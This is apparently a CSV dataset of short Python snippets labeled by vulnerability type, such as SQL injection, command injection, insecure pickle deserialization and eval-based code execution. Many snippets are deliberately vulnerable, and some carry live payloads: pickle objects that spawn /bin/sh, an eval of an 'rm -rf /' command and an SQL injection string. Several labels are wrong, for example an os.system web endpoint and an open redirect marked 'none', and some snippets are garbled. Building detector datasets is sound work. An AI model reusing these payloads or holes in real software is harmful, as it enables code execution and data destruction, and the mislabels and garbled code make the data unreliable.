snippet,vulnerability
"import subprocess
def execute_command(user_input):
    try:
        result = subprocess.run(user_input, shell=True, check=True, capture_output=True, text=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f""Command execution failed with error: {e}"")
execute_command(input(""Enter your command: ""))",['command_injection']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='"" + username + ""'""
    cursor.execute(query)
    results = cursor.fetchall()
    return results
print(get_user_info(""test')) OR '1'='1""))",['sqli']
"import random
def foo():
    try:
        return random.choice([1, 2, 3])
    except Exception as e:
        print(f""An error occurred: {e}"")
        return None
for _ in range(10):
    print(foo())",['none']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_ImportFrom(self, node):
        raise ValueError(""Imports are not allowed"")
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id == 'exec':
            raise ValueError(""exec is not allowed"")
def validate_ast(tree):
    RestrictedPython().visit(tree)
def run_code(user_input):
    tree = ast.parse(user_input, mode='single')
    validate_ast(tree)
    exec(compile(tree, filename=""<ast>"", mode=""single""))",['arbitrary_code_exec']
"import subprocess
def run_command(user_input):
    if "";"" in user_input or ""&&"" in user_input or ""|"" in user_input or ""&"" in user_input:
        print(""Invalid input"")
        return
    command = ['ls', user_input]
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f""Command execution failed with error: {e}"")
run_command('-al')",['none']
"import sqlite3
def login(username, password):
    conn = sqlite3.connect('user_data.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    result = cursor.fetchone()
    return result is not None",['sqli']
"import pickle
import os
import subprocess
class RCE:
    def __reduce__(self):
        return (subprocess.call, (['echo', 'You have been hacked'],))
rce_instance = RCE()
pickled = pickle.dumps(rce_instance)
print(pickled)
deserialized = pickle.loads(pickled)",['insecure_deserialization']
"import os
def run_command(user_input):
    command = 'ls ' + user_input
    os.system(command)
run_command('-al')",['command_injection']
"import gc
class MemoryLeakClass:
    def __init__(self):
        self.data = []
    def add_data(self, data):
        self.data.append(data) Gene
The code is vulnerable to a memory leak vulnerability in Python. This occurs when objects are not properly dereferenced, leading to memory being allocated but not able to be accessed.
To fix this, we can use garbage collection (gc module in Python). The gc module provides an interface to the optional part of the Python interpreter that manages memory management. In this
Here is the optimized code:",['none']
"import os
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password
def login(user):
    try:
        command = f""grep -q {user.username} /etc/passwd""
        os.system(command)
        if os.WEXITSTATUS(os.system(f""sudo -l -U {user.username}"")) == 0:
            print(""Login successful"")
        else:
            print(""Login failed"")
    except Exception as e:
        print(e)",['command_injection']
"import subprocess
def execute_command(user_input):
    command = user_input.split()
    subprocess.run(command, shell=False)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import time
def vulnerable_function():
    user_input = input(""Enter your command: "")
    eval(user_input)",['arbitrary_code_exec']
"import sqlite3
def login(username, password):
    conn = sqlite3.connect('user_data.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username=? AND password=?""
    cursor.execute(query, (username, password))
    result = cursor.fetchone()
    return result is not None",['none']
"def receive_input():
    user_input = input(""Enter your input: "")
    buffer = bytearray(10)
    for i in range(len(user_input)):
        buffer[i] = ord(user_input[i])
    return buffer
print(receive_input())",['buffer_overflow']
"import subprocess
def safe_function(user_input):
    if ""__import__"" in user_input or ""exec("" in user_input or ""eval("" in user_input or ""open("" in user_input or ""os."" in user_input:
        raise ValueError(""Invalid input"")
    else:
        subprocess.call(user_input, shell=True)
safe_function(""echo 'Hello World!'"")",['arbitrary_code_exec']
"def get_user_input():
    return input(""Enter your command: "")
def execute_command(cmd):
    try:
        compiled_code = compile(cmd, '<string>', 'eval')
        for character in cmd:
            if character not in '0123456789+-*/(). ':
                print('Invalid command. Only numbers and +-*/() are allowed.')
                return
        eval(compiled_code)
    except SyntaxError:
        print('Invalid command. Please enter a valid mathematical expression.')
def main():
    cmd = get_user_input()
    execute_command(cmd)",['arbitrary_code_exec']
"import sys
def create_large_list():
    list = []
    for i in range(10**6):
        list.append(""a""*10**6)
    return list
def main():
    large_list = create_large_list()
    print(sys.getsizeof(large_list))
if __name__ == ""__main__"":
    main()",['none']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if not isinstance(node.func, ast.Name):
            raise ValueError('Invalid use of function call')
        if node.func.id not in ['print', 'open']:
            raise ValueError('Invalid function call')
        super().generic_visit(node)
def restricted_eval(code):
    tree = compile(code, filename=""<ast>"", mode=""eval"")
    visitor = RestrictedPython()
    visitor.visit(tree)
    return eval(code)
def dangerous_function(user_input):
    restricted_eval(user_input)
user_input = input(""Enter your command: "")
dangerous_function(user_input)",['arbitrary_code_exec']
"import subprocess
def execute_command(user_input):
    command = ['bash', '-c', f""echo -n {user_input} | wc -c""]
    result = subprocess.run(command, capture_output=True, text=True)
    print(result.stdout.strip())
while True:
    user_input = input(""Enter your string: "")
    execute_command(user_input)",['command_injection']
"import os
import sys
def evaluate_input(user_input):
    return eval(user_input)
def main():
    while True:
        user_input = input(""Enter something to evaluate: "")
        print(evaluate_input(user_input))
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"from flask import Flask, request
import sqlite3
app = Flask(__name__)
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username=? AND password=?""
    cursor.execute(query, (username, password))
    user = cursor.fetchone()
",['none']
"import os
class UserInput:
    def __init__(self):
        self.user_input = input(""Enter your command: "")
class CommandExecutor:
    def execute(self, user_input):
        eval(user_input)
def main():
    user_input = UserInput().user_input
    CommandExecutor().execute(user_input)
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"def overflow_buffer(data):
    buffer = bytearray(10)
    for i in range(len(data)):
        buffer[i] = data[i]
    return buffer
data = bytearray(20)
for i in range(20):
    data[i] = 0x41
print(overflow_buffer(data))",['none']
"import pickle
import os
import subprocess
class RCE:
    def __reduce__(self):
        return (subprocess.Popen, ('cmd /c calc',),)
def serialize(obj):
    return pickle.dumps(obj)
def deserialize(serialized_data):
    return pickle.loads(serialized_data, encoding='bytes')
deserialize(serialize(RCE()))",['insecure_deserialization']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'Hacked'],),)
safe_data = pickle.dumps(SafePickle())
pickle.loads(safe_data)",['insecure_deserialization']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='%s'"" % username
    cursor.execute(query)
    user_info = cursor.fetchone()
    return user_info",['sqli']
"import sqlite3
from flask import Flask, request
app = Flask(__name__)
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)",['sqli']
"import random
import string
def generate_random_string(length=10):
    return ''.join(random.choice(string.ascii_letters) for i in range(length))
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password
def login():
    username = input(""Enter your username: "")
    password = input(""Enter your password: "")
    eval(input(""Enter your Python code: ""))
login()",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id == ""eval"":
            raise ValueError(""Eval function is not allowed"")
        self.generic_visit(node)
def evaluate_code(user_input):
    tree = ast.parse(user_input, mode='exec')
    RestrictedPython().visit(tree)
    exec(compile(tree, filename=""<ast>"", mode=""exec""))
user_input = input(""Enter some code to evaluate: "")
try:
    evaluate_code(user_input)
except ValueError as e:
    print(e)",['arbitrary_code_exec']
"import re
from flask import Flask, request
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    sanitized_code = re.sub(r'\b(os|sys|eval)\b', '', code)
    exec(sanitized_code)
    return 'Code executed successfully!'
if __name__ == '__main__':
    app.run(debug=True)",['arbitrary_code_exec']
"import time
def evaluate_input(user_input):
    try:
        result = eval(user_input)
        print(""Result: "", result)
    except Exception as e:
        print(""Error: "", str(e))
user_input = ""__import__('os').system('rm -rf /')""
start_time = time.time()
evaluate_input(user_input)
end_time = time.time()
print(""Execution time: "", end_time - start_time)",['arbitrary_code_exec']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
pickled_data = pickle.dumps(EvilPickle())
unpickled_data = pickle.loads(pickled_data)",['insecure_deserialization']
"import sqlite3
from sqlite3 import Error
def fetch_user_data(conn, username):
    cursor = conn.cursor()
    cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
    rows = cursor.fetchall()
    for row in rows:
        print(row)",['none']
"import os
from flask import Flask, request
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    eval(code)
if __name__ == ""__main__"":
    app.run()",['arbitrary_code_exec']
"import os
def run_command(user_input):
    command = ""ls "" + user_input
    os.system(command)
def evaluate_input():
    user_input = input(""Enter your command: "")
    eval(user_input)
evaluate_input()","['arbitrary_code_exec', 'command_injection']"
"import subprocess
def run_command(user_input):
    command = ['ls', user_input]
    subprocess.run(command, check=True)",['path_traversal']
"import flask
app = flask.Flask(__name__)
@app.route('/evaluate', methods=['POST'])
def evaluate():
    data = flask.request.form.get('data')
    result = eval(data)
    return str(result)
if __name__ == '__main__':
    app.run(debug=True)",['arbitrary_code_exec']
"import subprocess
def execute_user_command():
    user_input = input(""Enter your command: "")
    subprocess.run(user_input, shell=True, check=True)
execute_user_command()",['command_injection']
"import pickle
import subprocess
class RunBinSh(object):
    def __init__(self):
        self.command = '/bin/sh'
    def __getstate__(self):
        raise TypeError('Cannot serialize this object')
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    return malicious
def deserialize_exploit(serialized_exploit):
    try:
        obj = pickle.loads(serialized_exploit)
        subprocess.Popen([obj.command])
    except TypeError as e:
        print(f""Error: {e}"")",['insecure_deserialization']
"def add_numbers(a, b):
    return a + b
print(add_numbers(10, 20))
print(add_numbers('10', '20'))
print(add_numbers('10', 20))",['none']
"import pickle
import subprocess
class RCE:
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],),)
pickled = pickle.dumps(RCE())
unpickled = pickle.loads(pickled)",['insecure_deserialization']
"import pickle
import os
import sys
class VulnerableClass:
    def __init__(self):
        self.data = []
    def add_data(self, item):
        self.data.append(item)
    def save_to_file(self, filename):
        try:
            with open(filename, 'wb') as file:
                pickle.dump(self, file, protocol=pickle.HIGHEST_PROTOCOL)
        except Exception as e:
            print(f""Error occurred while saving to file: {e}"")
            sys.exit(1)
def load_from_file(filename):
    try:
        with open(filename, 'rb') as file:
            return pickle.load(file)
    except Exception as e:
        print(f""Error occurred while loading from file: {e}"")
        sys.exit(1)",['insecure_deserialization']
"import pickle
import os
import subprocess
class SafeClass:
    def __init__(self):
        self.command = 'echo ""You have been hacked!""'
    def __reduce__(self):
        return (subprocess.run, (self.command,))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_object = SafeClass()
serialize_and_deserialize(safe_object)",['insecure_deserialization']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_and_deserialize():
    data = pickle.dumps(EvilClass())
    deserialized_data = pickle.loads(data)
    return deserialized_data
serialize_and_deserialize()",['insecure_deserialization']
"import os
def execute_command(user_input):
    os.system(user_input)
execute_command(input(""Enter your command: ""))",['command_injection']
"import os
from flask import Flask, request
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_command():
    command = request.form.get('command')
    os.system(command)
    return 'Command executed'
if __name__ == '__main__':
    app.run(debug=True)",['none']
"import ast
import sys
class ExpressionTransformer(ast.NodeTransformer):
    def visit_Call(self, node):
        raise ValueError(""Not allowed"")
def evaluate_input(user_input):
    tree = ast.parse(user_input, mode='eval')
    ExpressionTransformer().visit(tree)
    code = compile(tree, '', 'eval')
    result = eval(code)
    return result",['arbitrary_code_exec']
"def get_value(dic, key):
    return dic.get(key)
my_dict = {""name"": ""John"", ""age"": 30}
print(get_value(my_dict, ""name""))
print(get_value(my_dict, ""city""))",['none']
"import subprocess
def execute_command(user_input):
    command_parts = user_input.split()
    if len(command_parts) > 0 and command_parts[0] == ""ls"":
        result = subprocess.run(command_parts, capture_output=True, text=True)
        print(result.stdout)
    else:
        print(""Invalid command."")
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username = '"" + username + ""'""
    cursor.execute(query)
    user_info = cursor.fetchone()
    return user_info",['sqli']
"import os
def execute_code(user_input):
    exec(user_input)
def get_user_input():
    return input(""Enter some Python code to execute: "")
def main():
    while True:
        user_input = get_user_input()
        execute_code(user_input)
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"import os
import subprocess
def run_command(user_input):
    command = [""ls"", user_input]
    result = subprocess.run(command, capture_output=True, text=True)
    print(result.stdout)
def get_user_input():
    return input(""Enter your command: "")
def main():
    user_input = get_user_input()
    run_command(user_input)",['command_injection']
"import ctypes
def create_string(size):
    if size <= 0:
        raise ValueError(""Size must be greater than zero"")
    return ctypes.create_string_buffer(size)
def overflow_string(s, index, value):
    if index < 0 or index >= len(s):
        raise IndexError(""Index out of range"")
    s[index] = value
try:
    s = create_string(20)
    overflow_string(s, 19, b'X')
except Exception as e:
    print(f""An error occurred: {e}"")",['none']
"import pickle
import os
import subprocess
class SafeClass:
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_instance = SafeClass()
serialize_and_deserialize(safe_instance)",['insecure_deserialization']
"import pickle
import os
import subprocess
class EvilClass(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', '""You have been hacked!""'],))
def serialize_and_deserialize():
    evil = EvilClass()
    serialized_data = pickle.dumps(evil)
    deserialized_data = pickle.loads(serialized_data)
    return deserialized_data
serialize_and_deserialize()",['insecure_deserialization']
"import pickle
import os
import subprocess
class SafePickle(object):
    def __init__(self, cmd):
        self.cmd = cmd
def pikcy_dumps(obj):
    return pickle.dumps(obj, protocol=0)
def pikcy_loads(serialized):
    return pickle.loads(serialized)
def execute_command(cmd):
    subprocess.call(cmd, shell=True)
if __name__ == ""__main__"":
    safe_pickle = SafePickle('echo ""Hacked!"" > /tmp/hacked.txt')
    serialized_data = pikcy_dumps(safe_pickle)
    deserialized_data = pikcy_loads(serialized_data)
    execute_command(deserialized_data.cmd)",['insecure_deserialization']
"import ast
from typing import Any
def evaluate_input(user_input: str) -> Any:
    try:
        tree = ast.parse(user_input, mode='eval')
        if len(tree.body) > 1:
            raise ValueError(""Only one expression can be evaluated at a time"")
        for node in ast.walk(tree):
            if not isinstance(node, (ast.Expr, ast.Expression, ast.Module)):
                raise ValueError(""Only expressions can be evaluated"")
        result = eval(compile(tree, filename=""<ast>"", mode='eval'))
    except Exception as e:
        print(f""Invalid input: {e}"")
        result = None
    return result
def main():
    while True:
        user_input = input(""Enter something to evaluate: "")
        print(evaluate_input(user_input))
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"import os
def execute_command(user_input):
    command = 'echo -n ' + user_input + ' | wc -c'
    os.system(command)
while True:
    user_input = input(""Enter your string: "")
    execute_command(user_input)",['command_injection']
"import ast
import operator as op
allowed_operations = {
    '+': op.add,
    '-': op.sub,
    '*': op.mul,
    '/': op.truediv,
}
def get_user_input():
    return input(""Enter your command: "")
def parse_command(command):
    tree = ast.parse(command, mode='eval')
    if len(tree.body.args) != 2:
        raise ValueError('Invalid command')
    left = tree.body.args[0].n
    right = tree.body.args[1].n
    op = allowed_operations[tree.body.op]
    return op(left, right)
while True:
    try:
        command = get_user_input()
        result = parse_command(command)
        print(result)
    except Exception as e:
        print(f""An error occurred: {e}"")",['none']
"import os
user_input = input(""Enter something here: "")
eval(user_input)",['arbitrary_code_exec']
"import pickle
import subprocess
class TestClass(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', '""pwned""', '>', '/tmp/pwn.txt'],))
data = pickle.dumps(TestClass())
print(pickle.loads(data))",['insecure_deserialization']
"import os
def run_command(user_input):
    command = ""ls "" + user_input
    os.system(command)
def run_command_with_eval(user_input):
    eval(user_input)
user_input = input(""Enter your command: "")
run_command(user_input)
run_command_with_eval(user_input)","['arbitrary_code_exec', 'command_injection']"
"def execute_user_input():
    user_input = input(""Enter your command: "")
    try:
        eval(user_input)
    except SyntaxError:
        print(""Invalid command"")
execute_user_input()",['arbitrary_code_exec']
"import os
import sys
def handle_input(user_input):
    os.system('echo ' + user_input)
if __name__ == ""__main__"":
    user_input = sys.argv[1]
    handle_input(user_input)",['command_injection']
"import os
input_str = ""__import__('os').system('dir')""
eval(input_str)",['arbitrary_code_exec']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'Hacked'],),)
data = pickle.dumps(SafePickle())
pickle.loads(data)",['insecure_deserialization']
"import os
def execute_command(user_input):
    command = ""ls "" + user_input
    os.system(command)
execute_command(""-la"")",['command_injection']
"from flask import Flask, request
app = Flask(__name__)
@app.route('/eval', methods=['POST'])
def evaluate():
    data = request.get_data()
    result = eval(data)
    return str(result)
if __name__ == '__main__':
    app.run(debug=True)",['arbitrary_code_exec']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!"" > /tmp/hacked.txt',))
def serialize_and_unserialize():
    data = pickle.dumps(EvilClass())
    return pickle.loads(data)
serialize_and_unserialize()",['insecure_deserialization']
"def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    user = cursor.fetchone()
    if user:
        return 'Logged in successfully', 200
    else:
        return 'Invalid credentials', 401",['sqli']
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    return malicious
def deserialize_exploit(serialized_exploit):
    pickle.loads(serialized_exploit)
if __name__ == '__main__':
    serialized_exploit = serialize_exploit()
    deserialize_exploit(serialized_exploit)",['insecure_deserialization']
"import logging
class CustomException(Exception):
    def __init__(self, message):
        self.message = message
def raise_exception():
    try:
        raise CustomException(""This is a custom exception"")
    except Exception as e:
        logging.error(e)
        return str(e)
raise_exception()",['none']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['eval', 'exec']):
            raise ValueError('eval/exec calls are not allowed')
        return self.generic_visit(node)
def restricted_eval(code, mode='eval'):
    tree = compile(code, '<input>', mode)
    RestrictedPython().visit(tree)
    return eval(tree)
def run_user_input():
    user_input = input(""Enter some Python code: "")
    try:
        restricted_eval(user_input)
    except Exception as e:
        print(f""Invalid input: {e}"")",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['eval', 'exec']):
            return self.generic_visit(node)
        raise ValueError('eval and exec are forbidden')
def run_code(user_input):
    parsed = ast.parse(user_input, mode='single')
    RestrictedPython().visit(parsed)
    compiled = compile(parsed, filename=""<ast>"", mode=""eval"")
    eval(compiled)
def main():
    user_input = input(""Enter some Python code to execute: "")
    Run_code(user_input)",['arbitrary_code_exec']
"@app.route('/', methods=['GET', 'POST'])
def my_form():
    form = MyForm()
    if form.validate_on_submit():
        try:
            exec(form.text.data)
        except Exception as e:
            print(f""Error executing code: {e}"")
            abort(400)
        return ''
 ",['arbitrary_code_exec']
"def process_data(user_input):
    if not isinstance(user_input, str):
        raise ValueError('Input must be a string')
    data = user_input + '\0'
    return data
def main():
    user_input = input(""Enter your data: "")
    if len(user_input) > 256:
        print(""Input too long. Please enter a shorter string."")
        return
    try:
        data = process_data(user_input)
        print(data)
    except ValueError as e:
        print(e)
if __name__ == ""__main__"":
    main()",['none']
"from flask import Flask, request, redirect
app = Flask(__name__)
@app.route('/redirect')
def unsafe_redirect():
    url = request.args.get('url')
    return redirect(url)",['none']
"import os
import sys
def vulnerable_function(user_input):
    command = ""echo -n "" + user_input + "" | wc -c""
    result = os.popen(command).read()
    return int(result)
if __name__ == ""__main__"":
    user_input = sys.argv[1]
    print(vulnerable_function(user_input))",['command_injection']
"def print_array(arr):
    for i in arr:
        print(i)
print_array([1, 2, 3, 4, 5])",['none']
"import sqlite3
def get_user(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    cursor.execute(""SELECT * FROM users WHERE username = ?"", (username,))
    user = cursor.fetchone()
    return user
print(get_user(""admin""));",['none']
"def infinite_loop(n):
    while True:
        n += 1
        infinite_loop(n)
infinite_loop(0)",['none']
"import pickle
import subprocess
class EvilPickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
def serialize_exploit():
    with open('evil.pickle', 'wb') as f:
        pickle.dump(EvilPickle(), f)
def deserialize_exploit():
    with open('evil.pickle', 'rb') as f:
        pickle.load(f)",['insecure_deserialization']
"import sqlite3
from flask import Flask, request
app = Flask(__name__)
@app.route('/login', methods=['GET', 'POST'])
def login():
    username = request.args.get('username')
    password = request.args.get('password')
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='"" + username + ""' AND password='"" + password + ""'""
    result = cursor.execute(query)
    if result.fetchone():
        return ""Login successful!""
    Else:
        return ""Invalid credentials!""
if __name__ == '__main__':
    app.run(debug=True)",['sqli']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo Attacker has been hacked > /tmp/hacked',))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
vulnerable_object = VulnerableClass()
serialize_and_deserialize(vulnerable_object)",['insecure_deserialization']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['print', 'open']):
            raise ValueError('Invalid function call')
        self.generic_visit(node)
        return node
def user_input():
    return input(""Enter something: "")
def safe_eval(user_input):
    tree = compile(user_input, filename=""<input>"", mode=""eval"")
    transformer = RestrictedPython()
    new_tree = transformer.visit(tree)
    code = compile(new_tree, filename=""<input>"", mode=""exec"")
    exec(code)
if __name__ == ""__main__"":
    user_input = user_input()
    safe_eval(user_input)",['arbitrary_code_exec']
"import ast
def safe_eval(user_input):
    tree = ast.parse(user_input, mode='eval')
    allowed_nodes = {
        ast.Expression,
        ast.Str,
        ast.Num,
        ast.BinOp,
        ast.UnaryOp,
        ast.operator,
        ast.unaryop,
        ast.cmpop,
        ast.boolop,
        ast.Name,
        ast.Load,
    }
    for node in ast.walk(tree):
        if type(node) not in allowed_nodes:
            raise UnsafeInputError('Unsafe input detected')
    return eval(compile(tree, filename='', mode='eval'))
def safe_function():
    user_input = input(""Enter something: "")
    try:
        result = safe_eval(user_input)
        print(result)
    except UnsafeInputError:
        print('Unsafe input detected')","['none']
"
"import sqlite3
from flask import Flask, request
app = Flask(__name__)
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    result = c.execute(query)
    if result.fetchone():
        return 'Login successful!'
    else:
        return 'Invalid credentials!'",['sqli']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not isinstance(node.func, ast.Name):
            raise ValueError('Invalid operation')
        return self.generic_visit(node)
def evaluate_input(user_input):
    tree = compile(user_input, ""<string>"", ""exec"")
    RestrictedPython().visit(tree)
    exec(tree)
while True:
    user_input = input(""Enter some Python code to execute: "")
    try:
        evaluate_input(user_input)
    except Exception as e:
        print(f""An error occurred: {e}"")",['arbitrary_code_exec']
"import hmac
import time
import os
from hashlib import sha256
def insecure_compare(a, b):
    if len(a) != len(b):
        return False
    for x, y in zip(a, b):
        time.sleep(0.001)
        if x != y:
            return False
    return True
message = os.urandom(16)
key = os.urandom(16)
digest_maker = hmac.new(key, message, sha256)
server_mac = digest_maker.digest()
client_mac = os.urandom(32)
while not insecure_compare(client_mac, server_mac):
    client_mac = os.urandom(32)",['none']
"import sqlite3
from flask import Flask, request
app = Flask(__name__)
@app.route('/login', methods=['GET', 'POST'])
def login():
    username = request.args.get('username')
    password = request.args.get('password')
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()overed
    query = ""SELECT * FROM users WHERE username=? AND password=?""
    result = cursor.execute(query, (username, password))
    if result.fetchone():
        return ""Login successful!""
    else:
        return ""Invalid credentials!""",['none']
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('malicious.pkl', 'wb') as f:
        pickle.dump(malicious, f)
if __name__ == ""__main__"":
    serialize_exploit()",['none']
"import os
def execute_command(user_input):
    command = ""echo %s > myfile.txt"" % (user_input)
    os.system(command)
execute_command(""A""*10000000)",['command_injection']
"def process_input(user_input):
    buffer = bytearray(1024)
    for i in range(len(user_input)):
        buffer[i] = user_input[i]
    return buffer
while True:
    user_input = input(""Enter your input: "")
    print(process_input(user_input))",['buffer_overflow']
"import sqlite3
def fetch_user_data(username):
    conn = sqlite3.connect('my_database.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}'"".format(username)
    cursor.execute(query)
    rows = cursor.fetchall()
    for row in rows:
        print(row)",['sqli']
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh())
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious_data, f)
def deserialize_exploit():
    with open('payload.dat', 'rb') as f:
        malicious_data = pickle.load(f)
        pickle.loads(malicious_data)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"import os
def evaluate_code(user_input):
    eval(user_input)
user_input = input(""Enter some Python code to execute: "")
evaluate_code(user_input)",['arbitrary_code_exec']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
vulnerable_data = pickle.dumps(EvilPickle())
pickle.loads(vulnerable_data)",['insecure_deserialization']
"def receive_input():
    user_input = input(""Enter your input: "")
    buffer = bytearray(min(len(user_input), 10))
    for i in range(len(buffer)):
        buffer[i] = ord(user_input[i])
    return buffer
print(receive_input())",['buffer_overflow']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('exploit.pkl', 'wb') as f:
        pickle.dump(malicious, f)
if __name__ == ""__main__"":
    serialize_exploit()",['insecure_deserialization']
"import os
def evaluate_input(user_input):
    return eval(user_input)
user_input = input(""Enter a command: "")
evaluate_input(user_input)",['arbitrary_code_exec']
